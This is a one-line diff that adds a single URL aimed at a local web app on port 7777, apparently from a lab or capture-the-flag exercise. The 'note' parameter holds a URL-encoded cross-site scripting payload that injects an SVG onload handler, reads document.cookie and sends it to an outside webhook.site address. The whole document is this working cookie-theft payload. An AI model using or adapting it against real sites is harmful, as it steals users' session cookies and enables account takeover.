@@ -1,0 +1,1 @@
+http://localhost:7777/?note=%22%3E%3Csvg/onload=fetch(`https://webhook.site/9345a8fb-8664-48d4-8686-6234c88f94ec/?c=${document.cookie}`)%3E
